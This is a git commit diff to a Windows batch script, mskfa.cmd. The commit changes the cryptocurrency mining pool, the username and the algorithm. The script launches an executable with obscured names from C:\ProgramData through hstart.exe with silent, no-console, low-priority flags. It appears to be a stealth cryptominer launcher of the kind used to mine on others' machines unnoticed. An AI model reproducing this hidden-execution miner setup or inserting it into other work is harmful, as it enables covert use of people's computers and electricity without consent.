1db631b08df689cda2a3140d56c03175967668ad
oliverafa <oliverafa@gmail.com>
2017-06-23 17:11:28 -0300

    Update mskfa.cmd

--- mskfa.cmd
+++ mskfa.cmd
@@ -1,6 +1,6 @@
 @echo off
 
-set minuser=oliverafa.2
-set minurl=stratum+tcp://us.multipool.us:3373
+set minuser=oliverafa@gmail.com
+set minurl=stratum+tcp://dsh.pool.minergate.com:45720
 
-start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -D -a x11 -o %minurl% -u %minuser% -p x"
+start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /BELOWNORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -D -a cryptonight -o %minurl% -u %minuser% -p x"
